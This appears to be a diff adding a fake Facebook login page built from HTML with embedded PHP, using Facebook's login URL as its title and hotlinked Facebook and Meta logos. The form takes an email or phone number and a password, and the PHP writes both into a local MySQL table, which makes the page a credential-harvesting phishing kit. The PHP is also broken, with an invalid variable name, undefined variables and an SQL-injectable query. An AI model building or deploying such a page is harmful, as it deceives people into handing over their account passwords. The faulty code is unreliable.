@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://www.facebook.com/login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTnFAAg8Dio836vkCTmFgvadOWw67392K49lPFRiNQxIw&s=10">
+</head>
+<body>
+    <div class="login">
+        <span><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTnFAAg8Dio836vkCTmFgvadOWw67392K49lPFRiNQxIw&s=10" class="facebook" alt="error"></span><br><br>
+        <h2>Log in to Facebook</h2>
+        <form method="POST">
+        <input type="text" id="Email or Phone Number" placeholder="Email or Phone Number" name="name"><br><br>
+        <input type="password" id="Password" placeholder="Password" name="password"><br><br>
+       <a href="impfile.html"> <button class="color1" type="submit" name="login">Log in</button></a><br><br>
+        <button class="color2" type="button">Forgot Password?</button><br><br><br>
+        <button class="color3" type="button">Create New Account</button><br>
+        </form>
+        <span><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6ZfLZErs_a5QBSjFOLY1LPhb-blWTF8rnPUrwgS2Jig&s=10" class="meta" alt="error"></span>
+
+    </div>
+    <?php
+    $con = mysqli_connect('localhost','root','','users');
+    if(isset($_POST['login'])){
+        $Email or Phone Number = $_POST['name'];
+        $Password = $_POST['password'];
+
+        $query = "INSERT INTO login('Email or Phone Number', 'Password') VALUES ('$name','$password')";
+        $run = mysqli_query($con,$query);
+    
+    }
+    ?>
+</body>
+</html>
